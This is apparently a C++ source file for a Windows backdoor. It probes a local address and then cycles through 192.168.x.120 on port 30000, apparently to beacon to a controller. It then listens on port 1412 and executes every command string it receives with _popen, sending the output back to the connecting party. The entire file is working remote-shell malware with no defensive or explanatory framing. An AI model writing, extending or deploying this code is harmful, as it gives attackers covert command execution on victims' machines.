#include <iostream>
#include <string>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <time.h>
#include <stdlib.h>
#include <iphlpapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

SOCKET client_socket;

void get_ip() {
	/*
	PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
	ULONG buflen = sizeof(IP_ADAPTER_INFO);
	if (GetAdaptersInfo(pAdapterInfo, &buflen) == ERROR_BUFFER_OVERFLOW) {
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)malloc(buflen);
	}
	if (GetAdaptersInfo(pAdapterInfo, &buflen) == NO_ERROR) {
		PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
		while (pAdapter) {
			printf("\tAdapter Name: \t%s\n", pAdapter->AdapterName);
			printf("\tAdapter Desc: \t%s\n", pAdapter->Description);
			printf("\tAdapter Addr: \t%ld\n", pAdapter->Address);
			printf("\tIP Address: \t%s\n", pAdapter->IpAddressList.IpAddress.String);
			printf("\tIP Mask: \t%s\n", pAdapter->IpAddressList.IpMask.String);
			printf("\tGateway: \t%s\n", pAdapter->GatewayList.IpAddress.String);
			if (pAdapter->DhcpEnabled) {
				printf("\tDHCP Enabled: Yes\n");
				printf("\t\tDHCP Server: \t%s\n", pAdapter->DhcpServer.IpAddress.String);
				printf("\tLease Obtained: %ld\n", pAdapter->LeaseObtained);
			}
			else {
				printf("\tDHCP Enabled: No\n");
			}
			if (pAdapter->HaveWins) {
				printf("\tHave Wins: Yes\n");
				printf("\t\tPrimary Wins Server: \t%s\n", pAdapter->PrimaryWinsServer.IpAddress.String);
				printf("\t\tSecondary Wins Server: \t%s\n", pAdapter->SecondaryWinsServer.IpAddress.String);
			}
			else {
				printf("\tHave Wins: No\n");
			}
			pAdapter = pAdapter->Next;
		}
	}
	else {
		printf("Call to GetAdaptersInfo failed.\n");
	}
	*/
}

void exe_cmd(char command[], int bytesrecved) {
	char outputBuffer[8192];
	ZeroMemory(outputBuffer, 8192);
	FILE* pPipe;
	if ((pPipe = _popen(std::string(command, 0, bytesrecved).c_str(), "rt")) == NULL) {
		std::string err_mess = "Cannot execute command!";
		send(client_socket, err_mess.c_str(), err_mess.size(), 0);
	}
	fread(outputBuffer, 1, 8192, pPipe);
	send(client_socket, outputBuffer, 8192, 0);
	if (feof(pPipe)) {
		_pclose(pPipe);
	}
}

void second_phase() {
	WSADATA wsadata;
	WORD ver = MAKEWORD(2, 2);
	WSAStartup(ver, &wsadata);

	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	sockaddr_in hint;
	std::string ipAddress = "127.0.0.1";
	int port = 30000;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(port);
	inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);
	int i = -1;
	char num[10];
	unsigned long iMode = 1;
	int iResult = ioctlsocket(sock, FIONBIO, &iMode);
	while (connect(sock, (sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR) {
		if (i > 255) {
			i = 0;
		}
		else {
			++i;
		}
		ZeroMemory(num, 10);
		_itoa_s(i, num, 10, 10);
		ipAddress = "192.168.";
		ipAddress.append(num);
		ipAddress.append(".120");
		inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);
 		std::cout << ipAddress << std::endl;
		Sleep(200);
	}
	closesocket(sock);
	WSACleanup();
}

void third_phase() {
	WSADATA wsadata;
	WORD ver = MAKEWORD(2, 2);
	WSAStartup(ver, &wsadata);

	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	sockaddr_in hint;
	int port = 1412;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(port);
	hint.sin_addr.S_un.S_addr = INADDR_ANY;
	bind(sock, (sockaddr*)&hint, sizeof(hint));
	listen(sock, NI_MAXSERV);
	sockaddr_in client;
	int clientsize = sizeof(client);
	client_socket = accept(sock, (sockaddr*)&client, &clientsize);
	//char host[NI_MAXHOST];
	//char serv[NI_MAXSERV];
	//ZeroMemory(host, NI_MAXHOST);
	//ZeroMemory(serv, NI_MAXSERV);
	//getnameinfo((sockaddr*)&client, clientsize, host, NI_MAXHOST, serv, NI_MAXSERV, 0);
	closesocket(sock);
	char buf[8192];
	int bytesrecved = 10;
	while (strcmp(buf, "exit") != 0 && bytesrecved > 2) {
		ZeroMemory(buf, 8192);
		bytesrecved = recv(client_socket, buf, sizeof(buf), 0);
		exe_cmd(buf, bytesrecved);
		//send(client_socket, buf, bytesrecved, 0);
	}
	closesocket(client_socket);
	WSACleanup();
}

int main() {
	second_phase();
	Sleep(500);
	third_phase();
	return 0;
}